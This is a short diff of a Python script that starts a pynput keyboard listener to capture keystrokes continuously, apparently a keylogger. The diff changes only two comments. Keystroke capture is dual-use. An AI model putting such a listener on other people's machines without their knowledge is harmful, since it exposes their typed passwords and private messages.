@@ -22,7 +22,7 @@ def on_release(key):
         return False
 
 
-# Create an instance of the keyboard listener
+# Script runs directly here then start the listener
 if __name__ == '__main__':
   listener = pynput.keyboard.Listener(on_press=on_press, on_release=on_release)
 
@@ -32,5 +32,5 @@ if __name__ == '__main__':
   # Keep the script running to continuously capture keystrokes
   listener.join()
 
-  # Keep the console open
+  # Allows input to be captured in the console
   input()
